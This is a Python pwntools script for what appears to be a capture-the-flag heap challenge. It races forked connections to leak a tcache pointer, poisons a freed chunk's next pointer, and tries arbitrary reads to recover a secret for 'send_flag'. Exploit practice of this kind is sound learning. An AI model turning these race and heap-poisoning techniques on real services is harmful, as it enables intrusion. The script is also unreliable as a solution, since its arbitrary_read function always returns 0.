import time 
from pwn import *
import os

def leak_tcache(r1, r2):
	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
	
	# os.fork() == 0 is the child, child does the following
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"A")
			r1.sendline(b"free 0") # hope for write() of printf to go right after this
		exit(0) # kills the child
		
	# else, parent (os.fork() returns pid
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait() # waits for the child to finish
	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	for output in output_set: # checking if there's a leak like b'MESSAGE: \x00@^J\x07\x00\x00\x00' starting from '\x00'
#		print(output[-1:])
		output = output[9:]
		if b'\x07' in output: # for bytes object, output[i] outputs integer
		# output[:1] is just the very last byte

			result = output[:6]
			result = u64(result.ljust(8, b'\x00'))
			
			
			print(p64(result)[:1])
			if (p64(result)[:1] != b'\x00'):
				result = result & ~0xff  # Clear the lowest 8 bits
				
			return result
	return 0
idx = 2
def controlled_allocations(r1, r2, addr, heap_base_addr):
	global idx
	r1.clean()
	r2.clean()
	
	addr_packed = p64(addr ^ heap_base_addr)
	xor_result = addr ^ heap_base_addr
	print(f"addr: {hex(addr)}")
	print(f"heap_base: {hex(heap_base_addr)}")  
	print(f"XOR result: {hex(xor_result)}")
	r1.sendline(f"malloc {idx}".encode()) # chunk A
	r1.sendline(f"malloc {idx + 1}".encode()) # chunk B
	r1.sendline(f"free {idx + 1}".encode()) # free B
	
	while True:
		print("Running Arbitrary Read on Address: ", hex(addr))
		if os.fork() == 0:
			r1.sendline(f"free {idx}".encode()) # free A
			os.kill(os.getpid(), 9)
		else:
			r2.send((f"scanf {idx} ".encode() + addr_packed + b"\n") * 2000)
			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
			# overwriting freed A's next pointer to be the target address
			os.wait()
		
		time.sleep(0.1)
		
		r1.sendline(f"malloc {idx}".encode()) # this malloc gets A
		r1.sendline(f"printf {idx}".encode())
		r1.readuntil(b"MESSAGE: ")
		stored = r1.readline()[:-1] #
		print(stored)
	#	print(addr_packed.split(b'\x00')[0])
		
		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
			print("hi I am here!")
			print(stored)
			break
	
	print("yo 1")
	#r1.sendline(f"malloc {idx + 1}".encode()) # gets B (returned at injected address's location
	print("yo 2")
	r1.clean()
	print("yo 3")
	idx += 2

def arbitrary_read(r1, r2, addr, heap_base_addr):
	
	if os.fork() == 0:
		for _ in range(10000):
			r1.sendline(f"malloc {idx - 1}".encode()) 
		exit(0)
	else: 
		for _ in range(10000):
			r2.sendline(f"printf {idx - 1}".encode())
		os.wait()

	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	
	return 0
	
	
	
	

p = process('./babyprime_level3.0_patched')
r1 = remote("localhost", 1337)
r2 = remote("localhost", 1337)
leak = leak_tcache(r1, r2)


offset1 = 0x8a0 # from heap base 0x8a0 0xf20 0xd40	
offset2 = 0x7ff640 # from second leak to base
offset3 = 0x7fe8c0 # from base to last leak
offset4 = 0x21b3c0  # from second leak to final 0x41a3c0 0xe1a3c0 0x416800 0xe16800


if leak:
	print("tcache next pointer: ", hex(leak))
	#print(f"\nGDB: gdb -p {p.pid}")
	
		
	print(hex((leak << 12) + offset1))
	#pause()
	
	
	leak2 = arbitrary_read(r1, r2, (leak << 12) + offset1, leak)
	print("second leak: ", hex(leak2))
	idx += 2000
	
	# Close and reopen connections to get fresh heap state
	#r1.close()
	#r2.close()
	#r1 = remote("localhost", 1337)
	#r2 = remote("localhost", 1337)
	
	secret_location = leak2 - offset4
	print("Secret location: ", hex(secret_location))
	print(f"\nGDB: gdb -p {p.pid}")
	pause()
	
	secret = arbitrary_read(r1, r2, secret_location, leak)
	secret = secret.to_bytes(8, 'little')
	print(f"Secret string: {secret}")

	r1.clean()
	r1.sendline(b"send_flag")
	r1.recvuntil(b"Secret: ")
	r1.sendline(secret)
	response = r1.recvall(timeout=2)
	print(f"Server response: {response}")	
else:
	pause()
	print("Failed to leak")



p.kill()




# this is too good
# I think this is by far my favourite challenge
# so fucking challenging and thus so fucking fun to learn with


